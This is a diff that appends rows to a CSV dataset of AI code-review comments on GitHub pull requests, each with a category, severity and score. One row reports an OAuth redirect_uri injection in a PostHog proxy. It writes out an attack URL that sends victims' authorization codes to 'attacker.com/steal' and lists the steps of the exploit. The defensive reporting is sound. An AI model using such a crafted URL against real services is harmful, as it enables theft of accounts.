@@ -6672,3 +6672,168 @@ const hasImport = contentLines.some((line) =>
   singleLineImportRegex.test(line) || multilineImportRegex.test(line)
 )
 ```",https://github.com/cedarjs/cedar/pull/1302#discussion_r2882669515,,2026-03-04T09:16:15.659000,Idempotency bug causes duplicate import insertion on re-runs,logic,medium,8,"This is a genuine logic bug where removing a regex pattern breaks idempotency checking, causing duplicate imports to be inserted on subsequent CLI runs. The catch requires understanding the interaction between the regex patterns and the inserted content, making it non-obvious. It would cause real problems for users running the setup command multiple times.",2026-03-04T16:23:31.608200+00:00
+cyberdesk-hq/cyberdriver,41,"v0.0.40: variable type waiting, timestamps, autocreate CyberdeskTransfers, shutdown cyberdriver endpoint",https://github.com/cyberdesk-hq/cyberdriver/pull/41,"**Fallback lock creation has a race condition**
+
+```python
+typing_lock: Optional[asyncio.Lock] = getattr(app.state, ""keyboard_type_lock"", None)
+if typing_lock is None:
+    typing_lock = asyncio.Lock()
+    app.state.keyboard_type_lock = typing_lock
+```
+
+If two coroutines both read `None` before either has written back (possible since there is an `await` between the read and the eventual write), they each create their own `asyncio.Lock`. The second writer wins, so both coroutines end up using **different** lock objects and the mutual-exclusion guarantee is lost.
+
+In practice the lifespan handler always initialises `keyboard_type_lock` before any requests arrive, so this path is rarely taken. But if it ever is (e.g. in tests or if the app is started without `lifespan`), the dedupe logic silently breaks. The safest fix is to initialise the lock unconditionally in `lifespan` and remove the fallback here, or use `asyncio.Lock()` at module level.
+
+<details><summary>Prompt To Fix With AI</summary>
+
+`````markdown
+This is a comment left during a code review.
+Path: cyberdriver.py
+Line: 3449-3452
+
+Comment:
+**Fallback lock creation has a race condition**
+
+```python
+typing_lock: Optional[asyncio.Lock] = getattr(app.state, ""keyboard_type_lock"", None)
+if typing_lock is None:
+    typing_lock = asyncio.Lock()
+    app.state.keyboard_type_lock = typing_lock
+```
+
+If two coroutines both read `None` before either has written back (possible since there is an `await` between the read and the eventual write), they each create their own `asyncio.Lock`. The second writer wins, so both coroutines end up using **different** lock objects and the mutual-exclusion guarantee is lost.
+
+In practice the lifespan handler always initialises `keyboard_type_lock` before any requests arrive, so this path is rarely taken. But if it ever is (e.g. in tests or if the app is started without `lifespan`), the dedupe logic silently breaks. The safest fix is to initialise the lock unconditionally in `lifespan` and remove the fallback here, or use `asyncio.Lock()` at module level.
+
+How can I resolve this? If you propose a fix, please make it concise.
+`````
+</details>",https://github.com/cyberdesk-hq/cyberdriver/pull/41#discussion_r2875136051,,2026-03-02T23:04:40.846000,Race condition in async lock creation breaks mutual exclusion,concurrency,high,8,"This identifies a real race condition where two coroutines could create separate asyncio.Lock instances, completely defeating the mutual exclusion guarantee. While the lifespan handler normally prevents this, the fallback path has a genuine concurrency bug that could cause typing deduplication to silently fail.",2026-03-04T18:26:27.998694+00:00
+useautumn/autumn,876,fix: 🐛 allow either or both in price.tiers type,https://github.com/useautumn/autumn/pull/876,"The `.refine()` validation will always pass and never catch anything. Because `amount` is declared as `.optional().default(0)`, Zod applies the default _before_ the refinement runs — so by the time the callback executes, `z.amount` is always `0`, never `undefined`.
+
+The condition `z.amount !== undefined || z.flat_amount !== undefined` evaluates to `0 !== undefined || ...`, which is always `true`.
+
+To make this validation meaningful, the default needs to be applied *after* the refine, not before. Consider this structure:
+
+```suggestion
+export const UsageTierSchema = z
+  .object({
+    to: z.number().or(z.literal(Infinite)),
+    amount: z.number().optional(),
+    flat_amount: z.number().optional(),
+  })
+  .refine(
+    (val) => val.amount !== undefined || val.flat_amount !== undefined,
+    {
+      message: ""Either amount or flat_amount, or both must be defined"",
+      path: [""amount"", ""flat_amount""],
+    },
+  )
+  .transform((val) => ({
+    ...val,
+    amount: val.amount ?? 0,
+  }));
+```
+
+This way, the refine callback runs on the raw data (before defaults), and the default is applied afterward via transform.
+
+<details><summary>Prompt To Fix With AI</summary>
+
+`````markdown
+This is a comment left during a code review.
+Path: shared/models/productModels/priceModels/priceConfig/usagePriceConfig.ts
+Line: 22-30
+
+Comment:
+The `.refine()` validation will always pass and never catch anything. Because `amount` is declared as `.optional().default(0)`, Zod applies the default _before_ the refinement runs — so by the time the callback executes, `z.amount` is always `0`, never `undefined`.
+
+The condition `z.amount !== undefined || z.flat_amount !== undefined` evaluates to `0 !== undefined || ...`, which is always `true`.
+
+To make this validation meaningful, the default needs to be applied *after* the refine, not before. Consider this structure:
+
+```suggestion
+export const UsageTierSchema = z
+  .object({
+    to: z.number().or(z.literal(Infinite)),
+    amount: z.number().optional(),
+    flat_amount: z.number().optional(),
+  })
+  .refine(
+    (val) => val.amount !== undefined || val.flat_amount !== undefined,
+    {
+      message: ""Either amount or flat_amount, or both must be defined"",
+      path: [""amount"", ""flat_amount""],
+    },
+  )
+  .transform((val) => ({
+    ...val,
+    amount: val.amount ?? 0,
+  }));
+```
+
+This way, the refine callback runs on the raw data (before defaults), and the default is applied afterward via transform.
+
+How can I resolve this? If you propose a fix, please make it concise.
+`````
+</details>",https://github.com/useautumn/autumn/pull/876#discussion_r2883057052,,2026-03-04T10:39:53.481000,Zod validation always passes due to default ordering,logic,high,8,"This is a meaningful logic bug where Zod's `.default(0)` is applied before `.refine()`, causing the validation that requires either `amount` or `flat_amount` to always pass (since `amount` becomes `0` before the check). This would allow invalid data without either field specified to pass validation in production. The catch demonstrates deep understanding of Zod's execution order and is not something a linter would catch.",2026-03-04T18:26:27.998694+00:00
+posthog/posthog,49713,feat(flags): add soft-delete manager to FeatureFlag,https://github.com/PostHog/posthog/pull/49713,"The restore path restores the original key without verifying it is still available. If another flag was created with the same key after the original was soft-deleted, restoring the deleted flag will hit the unique constraint on `(team, key)`, resulting in an unhandled IntegrityError (500 response) instead of a clean 400 validation error.
+
+Before restoring the key, check whether another active flag already uses it. If so, raise a `serializers.ValidationError` with a clear message asking the user to rename the conflicting flag first. This mirrors the existing `validate_key` method's behavior.",https://github.com/PostHog/posthog/pull/49713#discussion_r2880088922,This looks legit,2026-03-03T19:30:24.901000,Unique constraint violation on soft-deleted flag restore,data_integrity,high,8,This is a meaningful logic bug that would cause a 500 error in production when restoring a soft-deleted feature flag if another flag was created with the same key. The catch identifies a race condition/state conflict that's not immediately obvious and requires understanding the soft-delete lifecycle. It would result in user-facing errors and data integrity issues.,2026-03-04T18:26:27.998694+00:00
+nvidia-nemo/emerging-optimizers,115,Cleanup eig utils and improve test coverage,https://github.com/NVIDIA-NeMo/Emerging-Optimizers/pull/115,"**Inverted fallback condition breaks double-precision recovery**
+
+The condition `if force_double:` is the opposite of what is needed. The purpose of this `except` block is to fall back to double precision when the initial computation fails. That fallback is only meaningful when we haven't *already* used double precision — i.e., when `force_double=False`.
+
+As written:
+- When `force_double=True`: `stabilized_x` was already cast to `float64` on line 77. The except block casts it to `float64` again (no-op), then retries `eigh` on the same data — this will fail in the exact same way.
+- When `force_double=False`: if float32 `eigh` raises, the exception is immediately re-raised with no double-precision fallback.
+
+The original logic (`if not force_double:`) was correct. This appears to be an accidental negation.
+
+```suggestion
+        if not force_double:
+```",https://github.com/NVIDIA-NeMo/Emerging-Optimizers/pull/115#discussion_r2880066874,fixed,2026-03-03T19:25:01.815000,Inverted condition breaks double-precision fallback recovery,logic,high,9,"This is a significant logic bug where the fallback condition is inverted. When force_double=False and float32 eigh fails, the exception is re-raised instead of falling back to double precision. When force_double=True and it fails, it uselessly retries with the same data. This breaks the core fallback mechanism for numerical stability in eigenvalue computations.",2026-03-04T18:26:27.998694+00:00
+posthog/posthog,49823,fix: intercept OAuth callback at proxy to fix EU invalid_client errors,https://github.com/PostHog/posthog/pull/49823,"**Open redirect enables auth code theft**
+
+The callback handler forwards the authorization code to whatever URL the client originally placed in `redirect_uri` — but the regional server never validated that URL (it only saw `proxy_callback_url`). This creates a classic OAuth redirect_uri injection vulnerability:
+
+1. Attacker crafts: `GET /oauth/authorize/?client_id=PROXY_CLIENT_ID&redirect_uri=https://attacker.com/steal&state=attacker_state&_region=eu`
+2. Proxy stores `callback:attacker_state → https://attacker.com/steal` and forwards to regional server with `redirect_uri=https://oauth.posthog.com/oauth/callback/`
+3. Regional server validates proxy callback URL (registered ✓), issues auth code
+4. Regional server redirects to proxy callback with the code
+5. Proxy looks up `callback:attacker_state → https://attacker.com/steal` and 302s the victim's browser there — including the `code`
+6. Attacker exchanges the code for a token to the victim's PostHog account
+
+Because the attacker fully controls the `state` and `redirect_uri` parameters in their crafted authorize URL, and the regional server never validates the original `redirect_uri`, there is no server-side protection against this.
+
+Before this PR, the regional server enforced that `redirect_uri` matched a registered URI for the client. This PR removes that guarantee at the proxy level without replacing it with any equivalent check.
+
+A mitigation would be to store the registered `redirect_uris` (from the registration payload in `handleRegister`) in KV alongside the client mapping, then validate the incoming `redirect_uri` against those stored values in the authorize handler before saving it to the `callback:` key.
+
+<details><summary>Prompt To Fix With AI</summary>
+
+`````markdown
+This is a comment left during a code review.
+Path: services/oauth-proxy/src/handlers/callback.ts
+Line: 18-29
+
+Comment:
+**Open redirect enables auth code theft**
+
+The callback handler forwards the authorization code to whatever URL the client originally placed in `redirect_uri` — but the regional server never validated that URL (it only saw `proxy_callback_url`). This creates a classic OAuth redirect_uri injection vulnerability:
+
+1. Attacker crafts: `GET /oauth/authorize/?client_id=PROXY_CLIENT_ID&redirect_uri=https://attacker.com/steal&state=attacker_state&_region=eu`
+2. Proxy stores `callback:attacker_state → https://attacker.com/steal` and forwards to regional server with `redirect_uri=https://oauth.posthog.com/oauth/callback/`
+3. Regional server validates proxy callback URL (registered ✓), issues auth code
+4. Regional server redirects to proxy callback with the code
+5. Proxy looks up `callback:attacker_state → https://attacker.com/steal` and 302s the victim's browser there — including the `code`
+6. Attacker exchanges the code for a token to the victim's PostHog account
+
+Because the attacker fully controls the `state` and `redirect_uri` parameters in their crafted authorize URL, and the regional server never validates the original `redirect_uri`, there is no server-side protection against this.
+
+Before this PR, the regional server enforced that `redirect_uri` matched a registered URI for the client. This PR removes that guarantee at the proxy level without replacing it with any equivalent check.
+
+A mitigation would be to store the registered `redirect_uris` (from the registration payload in `handleRegister`) in KV alongside the client mapping, then validate the incoming `redirect_uri` against those stored values in the authorize handler before saving it to the `callback:` key.
+
+How can I resolve this? If you propose a fix, please make it concise.
+`````
+</details>",https://github.com/PostHog/posthog/pull/49823#discussion_r2884316090,,2026-03-04T15:05:17.362000,Open redirect vulnerability enables OAuth authorization code theft,security,critical,9,"Comment 1 identifies a critical OAuth security vulnerability where an attacker can inject a malicious redirect_uri that bypasses server-side validation, allowing them to steal authorization codes and gain access to victim accounts. This is a textbook OAuth redirect_uri injection attack with a clear exploitation path.",2026-03-04T18:26:27.998694+00:00
